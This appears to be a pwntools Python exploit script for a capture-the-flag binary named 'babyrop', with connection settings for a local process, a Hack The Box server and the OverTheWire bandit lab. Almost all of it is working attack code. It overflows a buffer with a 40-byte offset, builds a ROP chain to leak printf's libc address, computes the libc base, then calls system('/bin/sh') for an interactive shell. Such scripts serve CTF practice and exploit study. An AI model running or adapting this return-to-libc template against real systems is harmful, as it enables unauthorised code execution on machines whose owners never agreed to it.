from pwn import * # Import pwntools
import tty
import time
from binascii import unhexlify

context.log_level = 'debug'
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
#GDB = True
GDB = False

local_bin = "./babyrop"
remote_bin = "~/vuln" #For ssh
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it

if LOCAL:
    p = process(local_bin) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

elif REMOTETTCP:
    p = remote('docker.hackthebox.eu',31648) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(remote_bin) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets


if GDB:
    # attach gdb and continue
    # You can set breakpoints, for example "break *main"
    gdb.attach(p.pid, '''
        set follow-fork-mode child  
        break vuln
        ''')


####################
#### Find offset ###
####################
OFFSET = "A"*40
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(p.clean())
    p.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    p.interactive()
    exit()


#####################
#### Find Gadgets ###
#####################
PRINTF_PLT = elf.plt['printf'] #PRINTF_PLT = elf.symbols["PRINTF"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
VULN_PLT = elf.symbols['vuln']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
POP_RSI = (rop.find_gadget(['pop rsi','pop r15', 'ret']))[0] 

log.info("Main start: " + hex(MAIN_PLT))
log.info("Printf plt: " + hex(PRINTF_PLT))
# need rdi for printf format
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
# need rsi for printf value
log.info("pop rsi; pop r15; ret gadget: "+hex(POP_RSI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain for puts
    rop1 = OFFSET.encode('latin-1') + p64(POP_RSI) + p64(0x00)+ p64(0x00) + p64(POP_RDI) + p64(FUNC_GOT) + p64(PRINTF_PLT)+ p64(VULN_PLT)
    #Send our rop-chain payload
    p.sendlineafter(">", rop1) 
    # clean socket buffer (read all and print)
    received = p.clean().decode('latin-1') 
    # Parse leaked address
    received = received.strip()+'\x00\x00'
    leak = u64(received)
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("printf") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()

# Notice that if a libc was specified the base of the library will be saved in libc.address
# this implies that in the future if you search for functions in libc, the resulting address
# will be the real one, you can use it directly (NOT NEED TO ADD AGAINF THE LIBC BASE ADDRESS)

#################################
### GET SHELL with known LIBC ###
#################################
BINSH = next(libc.search("/bin/sh".encode())) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
rop2 = OFFSET.encode('utf-8') + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
p.sendline(rop2)
##### Interact with the shell #####
p.interactive() #Interact with the conenction
